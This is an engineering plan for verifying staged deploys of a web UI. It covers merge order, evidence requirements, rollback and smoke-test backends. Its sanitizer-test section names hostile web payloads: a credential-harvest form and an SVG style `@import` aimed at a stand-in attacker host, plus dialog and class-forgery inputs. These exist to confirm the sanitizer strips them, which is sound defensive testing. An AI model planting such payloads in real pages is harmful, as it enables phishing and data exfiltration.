# PLAN — Phase 2 deploy verification (task-state web UI)

Written 2026-07-27 during the provisioning outage, ahead of the deploys.
Modelled on `2026-07-27-task-state-phase1-live.md`, which is the evidence
standard to match.

Service `farmtable`, region `us-central1`, project `deploy-demo-test`.
Image `us-central1-docker.pkg.dev/deploy-demo-test/farmtable/farmtable-server:latest`.

## Deploy order — REVISED 2026-07-27 ~20:25Z, agreed with coordinator

1. **#195** markdown-sanitize — **now first.** Promoted on evidence, not
   convenience: I verified `git show origin/main:web/src/util/markdown.ts` is the
   bare `DOMPurify.sanitize(marked.parse(md))` with no `FORBID_TAGS`/
   `FORBID_ATTR`, and both `unsafeHTML` sinks are on `origin/main` too. The
   phishing vector is **live in the deployed binary right now**. The branch is
   independent (based directly on `7a0f220`), approved by all three reviewers,
   and one small cleanup round from ready. Coordinator verified all of this
   independently before agreeing.
2. **#191** terminal-predicate — small, Go-only. Approved by all three.
3. **#194** close-label-swap — Go-only. **Hard dependency on #191** (the branch
   is rebased onto `d7314cf`; it was previously stacked on only the first of
   #191's four commits). Also **gates Phase 2** — Phase 2's Available Queue is
   what makes this pre-existing bug prominently visible.
4. **Phase 2** web UI — branch **`attention-view`**, head `633f8f2`.

   > ⚠ **CORRECTED 2026-07-27 23:35Z — merge by the right branch NAME.**
   > This plan previously said the merge source was `task-state-web-ui-v2`.
   > **That name does not point at the reviewed tree.** Measured in the Phase 2
   > worktree:
   >
   > ```
   > attention-view        633f8f2   <- reviewed by all three reviewers
   > task-state-web-ui-v2  6d8ea23   [origin/task-state-web-ui-v2]
   > ```
   >
   > `attention-view` is a clean fast-forward **three commits ahead** —
   > `3fb65f2`, `f228e72`, `633f8f2` — and those three commits *are* the contract
   > §10 attention view. No divergence in the other direction.
   >
   > So merging `task-state-web-ui-v2` by name would have shipped Phase 2 **minus
   > its headline feature**, and minus precisely the delta that was unreviewed
   > until round 5. The suite would pass, the deploy would succeed, and the
   > feature would simply be absent.
   >
   > All three reviewers reported branch `task-state-web-ui-v2` at HEAD
   > `633f8f2` — correct in *their* clones, where that name was created pointing
   > at `633f8f2`. The name means different things in different clones; only the
   > **commit** is unambiguous. **Merge `633f8f2` by SHA and verify the SHA after
   > checkout.** Do not trust the branch name.

Each is a separate deploy with its own revision. Do not batch them: batching
destroys the ability to attribute a regression to a change, and Phase 1 already
demonstrated that live smoke catches things the test suite does not (PR #179).

### Merge order must EQUAL deploy order — merge one, deploy it, verify, then merge the next

This repo has **no CI/CD** (`.github/workflows/` does not exist). The image is
produced by Cloud Build from a **working tree at a point in time** and then
`gcloud run deploy`'d by digest/tag. Nothing is triggered by a push.

The consequence is easy to get wrong and expensive: if two approved branches are
merged to `main` before the next deploy runs, the next image silently contains
**both**, one revision carries two changes, and the "do not batch" rule above is
violated without anyone deciding to violate it. Attribution of any regression is
then gone.

So: **do not merge ahead.** Even for a branch that is fully approved and has no
conflicts, hold the merge until its turn. #191 in particular is approved and
mergeable right now — merging it early would batch it into #195's revision.

### Known collision surface, measured 2026-07-27 (before any merge)

| pair | overlap | risk |
|---|---|---|
| #191 ↔ #194 | Go, same file | already handled — #194 rebased onto `d7314cf` |
| #191/#194 ↔ Phase 2 | **none** — Phase 2 changes 0 `.go` files | none |
| #195 ↔ Phase 2 | `package.json`, `package-lock.json`, `tsconfig.test.json` | see below |

`markdown.ts` / `markdown.test.ts` do **not** overlap with Phase 2 — the
sanitizer itself lands uncontested.

Of the three overlapping files, two self-resolve in Phase 2's favour
(`tsconfig.test.json`'s glob subsumes #195's explicit include; the new
`run-node-tests.mjs` globs and hard-fails on a count mismatch, so #195's test
cannot silently stop running). The third is a real decision: **#195 declares
`jsdom@^29.1.1`, Phase 2 declares `jsdom@^26.1.0`, disjoint ranges.** Whichever
wins, one suite runs on an untested jsdom major — and one of those suites is the
sanitizer's.

> ### ✅ RESOLVED 2026-07-27 23:20Z — this conflict no longer exists
>
> Pushed upstream to the #195 cleanup round to settle on the small branch rather
> than mid-rebase, and it worked. `dev-195-cleanup` tested it empirically: the
> sanitizer suite passes on `^26.1.0`, and **95 payloads produce byte-identical
> output under 26.1.0 and 29.1.1**. #195 now declares `^26.1.0`, matching Phase
> 2, so the versions agree and there is nothing to resolve at rebase.
>
> Byte-identical across three majors is a much stronger result than "the suite
> passes" — it establishes that the sanitizer's behaviour is *not*
> jsdom-version-sensitive, which was the actual worry. Recorded because it also
> retires a latent risk: future jsdom bumps are no longer a security-relevant
> decision for this suite.
>
> `package-lock.json` will still conflict mechanically. The guidance below
> stands.

`package-lock.json` will also conflict. **Do not hand-merge it.** Resolve
`package.json` first, regenerate the lock with a clean install, then re-run
*both* suites — the Node scripts and the Vitest harness — before considering the
rebase done.

Full measured evidence, with both `package.json` files quoted in full and the
reproduction commands: `reports/evidence-merge-collision-surface.md`.

---

## Standing evidence bar (per phase, non-negotiable)

Copied from the Phase 1 log because it worked:

- Cloud Build ID + `SUCCESS` + finish time.
- **Real revision ID** (e.g. `farmtable-000NN-xxx`), and the previous revision
  recorded so rollback is one command.
- `gcloud run services describe farmtable --region us-central1 --format=json`
  showing the new revision at **100% traffic** — paste the `traffic` block.
- Unauthenticated `curl` returns **HTTP 302** (IAP still enforcing). A 200 here
  is a security regression and blocks the deploy.
- **ERROR-level log query for the new revision returns no entries.**
- Pre-merge gates pasted: `go build ./...`, `go test ./...`, `gofmt`,
  `npm run build`, `npx tsc --noEmit`, `govulncheck`, `git diff --check`.

Reminder: do not read build success from a pipeline exit code —
`go build ./... | tail -3; echo $?` reports `tail`'s status. Redirect, then check.

---

## Which backend to smoke against — READ BEFORE ANY FUNCTIONAL CHECK

Added 2026-07-27 after a near-miss. The only live GitHub-backed collection
mirrors `scion-frontiers/farmtable`, **this project's own issue tracker**. Every
write in a GitHub-backed smoke is a real write, through a real token, to real
issues we depend on.

**Default: use the built-in backend.** Reach for the GitHub collection only
where the change under test *is* the pass-through path — which is #194, and
nothing else.

| change | backend | why |
|---|---|---|
| #191 terminal predicate | built-in | availability is computed server-side; GitHub adds nothing |
| #194 close-label-swap | **GitHub `466c2baa`** | it *is* a pass-through bug; unavoidable |
| #195 sanitizer payloads | built-in | `renderMarkdown` is client-side; the backend is irrelevant |
| Phase 2 web UI | built-in | see below |

**Phase 2 in particular must not be smoked on the GitHub collection.** Its
checks are more destructive than they look: drag-reorder *writes ranks*;
exercising a hidden-neighbour band requires *constructing* held or
dependency-blocked tasks; and the attention-view check requires **cancelling or
`wont_fix`-ing a real prerequisite** to create the stranded state. Contract §11
then guarantees that stranding is *permanent and never auto-clears* — so doing
it to a real dependency chain in our own tracker leaves damage that no process
undoes. That is the one check in the entire plan whose side effect is designed
to be irreversible.

Where a GitHub write is genuinely unavoidable (#194 only): disposable issue,
number recorded, cleaned up afterwards. Details in the #194 section.

## Per-change functional verification

### #191 terminal-predicate
- A task in each terminal stage (`completed`, `wont_fix`, `duplicate`,
  `cancelled`) reports `available=false`.
- `ClaimTask` by ID on a terminal task is rejected (contract §14).

### #194 close-label-swap — needs a GitHub-sourced collection
This one cannot be verified on the built-in backend; it is a pass-through bug.

**RESOLVED 2026-07-27 — use this collection, by ID:**

| field | value |
|---|---|
| collection ID | `466c2baa-334e-439c-b9f9-abbe89eb8aae` |
| name | `github-mirror-scion-frontiers-farmtable-20260720` |
| `remote_id` | `scion-frontiers/farmtable` |

Confirmed live by direct Postgres query against Cloud SQL `scion-postgres-test`,
not inferred: ~1,417 attributable RPCs in the past week, most recent 20:06:18Z
today, and real GitHub round-trip signatures (`ListTasks` 0.76–1.2s / 86KB
against native's 0.02–0.05s). Source:
`reports/inv-github-collections-prod.md` §1–2.

Two things to carry into the smoke:

- **Ignore collection `39a35ce4` (`D17-Phase2-Test`).** It has no
  `linked_accounts` row and never reaches passthrough. It looks like the
  obvious "test" collection to use and it is the wrong one.
- **`linked_accounts.status` reads `'expired'` and this is cosmetic** — GitHub
  #200. Every GitHub-path request returns HTTP 200, including successful
  `UpdateTask` writes; zero 401/403 in the logs. Do not treat the flag as a
  blocker. **But if a label write fails during the smoke, re-check this before
  blaming #194** — a genuinely expired credential and #194's best-effort label
  swallow would present identically, and #194 deliberately does not fail the
  close when the label write fails.

### ⚠ This collection mirrors our own live project repo — do not smoke on real issues

`scion-frontiers/farmtable` is **the repository this project actually uses for
issue tracking**, including #191, #194, #195, #198, #199, #200, #201. The #194
verification claims and closes a task and swaps its stage labels; #195's
verification wants an attacker payload pasted into an issue body. Run either
against a live tracked issue and you have corrupted real project state — closed
a real issue, or left a phishing-form payload in the description of one.

So, mandatory:

1. **Create a disposable issue for the smoke.** Title it obviously, e.g.
   `SMOKE: task-state phase2 deploy verification — safe to close`.
2. Record its number in the deploy log.
3. **Never** run the claim/close cycle against an issue that is real work.
4. Close and clean up the smoke issue afterwards, and remove any `ft:stage/*`
   labels the smoke added.
5. For the **#195 payload tests**, prefer the local dashboard against a
   built-in-backend task. The sanitizer runs client-side, so it does not need
   the GitHub path at all — pasting a credential-harvest form into a real repo's
   issue body would be gratuitous, and it would persist there after the smoke.

This is not hypothetical caution. The smoke writes through a real token to a
real repo, and the whole point of #194 is that it *mutates labels*.
- Claim a task (gains `ft:stage/working`), then close it.
- Re-read it: must report `available=false`, and must NOT appear in the
  Available Queue.
- Confirm the stage label now matches the terminal stage.
- **Part 2 invariant**: a closed issue carrying a stale non-terminal label still
  reports `available=false` (this is the arm that does not depend on a write
  succeeding).

### Phase 2 web UI
- **Native phase controls are gone** (contract §10) — no phase selector, no
  native Ready/Blocked columns.
- **No console errors** on load and on interaction. Check explicitly; this is a
  named requirement.
- Available Queue shows only genuinely available work — the Phase 1 smoke caught
  exactly this class of bug (triage/in_review cards leaking in via the fallback
  predicate), so re-check it rather than assuming.
- Drag-reorder: no duplicate ranks written; relative position preserved.
  Specifically exercise a band containing a **hidden** neighbour (held, or
  dependency-blocked, or future-start) — this is the `bandFor` defect r4 fixes
  and it is invisible unless you deliberately construct it.
- **Refusal toasts actually appear** (H-2 / mutant `F3-05`): trigger a
  cross-band drop and a read-only-queue drop and confirm the user sees a toast.
  The failure mode is a silent snap-back, so "nothing happened" is the bug.
- **Attention view**: a task blocked by a `cancelled`/`wont_fix` prerequisite is
  discoverable through the filter without knowing in advance that it exists.

### #195 markdown-sanitize — CORRECTION to the original framing
The governing brief calls this "the XSS fix" and asks that it "hold under a real
`javascript:` URL test". That framing predates the audit. **The actual defect is
a phishing vector, not XSS**: the audit ran 29 payloads through a replica of the
real pipeline and found **0 script-execution survivors** — `javascript:` hrefs,
`on*=` handlers, `<script>`, `<iframe srcdoc>` and the mXSS/mglyph payload were
already stripped. What survived was `<form action="https://evil.example">` with
a password input, rendering a working credential-harvest form on a legitimate
origin.

So verify **both**, and label them honestly:
1. **The actual fix** — put the `<form action>` payload into a task description
   and confirm no form, no input, and no `action` attribute survive in the
   rendered inspector.

   **Use a built-in-backend task, NOT a mirrored GitHub issue body.** (An
   earlier draft of this plan said to use a GitHub issue; that was written
   before I knew the only live GitHub collection mirrors
   `scion-frontiers/farmtable`, our own issue tracker.) Sanitization happens
   client-side in `renderMarkdown`, so the GitHub path is irrelevant to what is
   being tested — and writing a credential-harvest form into a real repo's
   issue body would persist an attacker payload in our own tracker for no
   verification benefit whatsoever.
2. **The regression check** — a real `javascript:` URL and an `on*=` handler
   still do not execute. This currently holds; the point is to prove the
   `FORBID_*` config change did not reopen it.
3. Ordinary markdown still renders (headings, links, code, lists) — a sanitizer
   that breaks rendering is its own outage.
4. Confirm the task-list checkbox decision behaves as the developer documented.

**Added by the pre-merge cleanup round (`dev-195-cleanup`) — verify these too:**

5. **`<dialog>` is stripped.** Paste `<dialog open>Enter your password</dialog>`
   and confirm no `dialog` element survives while the text content does. The
   code review showed a surviving `dialog` gives an attacker an
   absolutely-positioned, auto-centred, **opaque-background** box with no `style`
   attribute needed — the exact primitive forbidding `style` was meant to deny.
6. **`class` is stripped.** Paste the audit's LOW-1 payload — a `<div
   class="comment"><div class="comment-header">…` forging an author and
   timestamp — and confirm the rendered result carries no `class` attributes and
   does **not** pick up the inspector's own comment styling. This is the
   shadow-DOM UI-forgery vector.
7. **Accessibility did not regress.** The task-list checkbox glyph must expose
   `role="img"` and an `aria-label` conveying checked/unchecked. The glyph
   substitution removed a real `<input type=checkbox>`, and the label is what
   replaces the semantics it carried.
8. **`<svg><style>` is stripped** — added 2026-07-27, found by
   `dev-195-cleanup` during SVG coverage work. `style` is in DOMPurify's SVG
   *tag* allowlist (verified in `dist/purify.cjs.js`, between `'stop'` and
   `'switch'`), so `<svg><style>…</style></svg>` survived with arbitrary CSS
   text intact even though top-level HTML `<style>` was already stripped. That
   defeats `FORBID_ATTR:['style']` far more completely than `<dialog>` or
   class-reuse do, because the attacker writes *arbitrary rules* into the
   component's own shadow root rather than reusing existing classes.
   Verify **two** things:
   - `<svg><style>:host{position:fixed;z-index:9999}</style></svg>` — no
     `style` element survives.
   - `<svg><style>@import url(https://evil.example/x.css)</style></svg>` — no
     remote fetch is attempted. This is the arm that matters most: `@import`
     and attribute-selector `url()` reach **off-origin without user
     interaction**, which is an exfil channel neither of the other two
     primitives has.

Do not report this as "XSS verified" if what was verified is the phishing
vector. Say precisely what was tested.

---

## Rollback

Record the previous ready revision before each deploy. Rollback is:

```bash
gcloud run services update-traffic farmtable \
  --region us-central1 --to-revisions <PREVIOUS_REVISION>=100
```

Trigger rollback on: unauthenticated `curl` returning 200, ERROR log entries
attributable to the new revision, or any console error on load.

## Note on who runs the deploy

Precedent from the Phase 1 log: two Scion deploy-agent starts became stuck in
`created` with no container, and **the manager took over and ran the deploy
directly**. Given the current provisioning outage that may recur. Deploy
execution is an operational action, not application-code implementation, so it
is within the manager's remit under the "last resort" carve-out — but the
verification evidence above must still be captured in full, and merges still
require the three independent approvals.

---

## Disclosures for ptone — REQUIRED in the deploy/completion report

> Added 2026-07-27 23:55Z. These are behavioural changes that passed engineering
> review without a separate product gate, on the coordinator's ruling that they
> bring code into line with the state model the contract already establishes
> rather than deciding new policy. **Transparency without a blocking pre-approval
> gate — which only works if the disclosure actually happens. Do not drop these.**

### D-1. #194 `0b87721` — an OPEN issue with a terminal stage label now reports `accepted`

**What changed.** `IssueToPhaseStage` (`labels.go:415`) no longer lets a terminal
stage label outrank GitHub reporting the issue as OPEN. Such an issue falls
through to `accepted` — the same stage an unlabelled open issue gets.

**Why it is a fix, not a policy change.** An OPEN issue should not display or
behave as terminal. The three ways this state arises are all already-broken
paths that defeat user intent, not workflows anyone relies on:
1. a reopened issue that kept its close-time label;
2. `ft update --stage completed`, which relabels but never closes the issue
   (audit **F7**, still open — the asymmetry is untouched);
3. a partially failed close.

The demotion makes an existing failure *visible* rather than creating one.

**Evidence it breaks nothing.** Five read-only checks: producers vs consumers,
the transition table (`transitions.go`), `graph_routing.go` (never sets `Stage`),
the import path (`ImportCollection` returns `ErrNotImplemented` on the
pass-through store), and the `ft close` / `ft release` verbs. Two tests guard
against over-breadth: `OpenIssueKeepsNonTerminalStage` (all six non-terminal
stages still win on an open issue) and `ClosedIssueKeepsTerminalStage` (a closed
`wont_fix` must not become `completed`).

**Status:** upheld by the EM, ruled on by the coordinator, and put to the #194
round-2 reviewers as a claim to *attack* rather than ratify. **If that adversarial
review did not survive, this disclosure is void — check before reporting.**

### D-2. #194 — `stage` is still read two ways (known, deliberate, fail-safe)

The same round whose headline commit is `a70d3d1` *"Read the remote issue state
field exactly one way"* leaves **stage** read two ways:

| path | reads stage via | applies the D-1 demotion? |
|---|---|---|
| pass-through read (`passthrough.go:205`) | `IssueToPhaseStage` | yes |
| tree walk (`treewalk.go:36,53`) | `MapLabelsToStage` direct | **no** |

**Observable effect:** an open, terminal-labelled issue is available and claimable
but does not appear in `GetReadyTasks`. The queue *under*-reports — fail-safe.

Pinned by `TestComputeReady_OpenTerminalLabelledIssueIsNotReady`, whose failure
message instructs its own deletion once the tree walk learns the rule. Not a merge
blocker; it is the **top follow-up** on the cleanup branch. Both the EM and the
implementing dev independently named it the next thing to route.
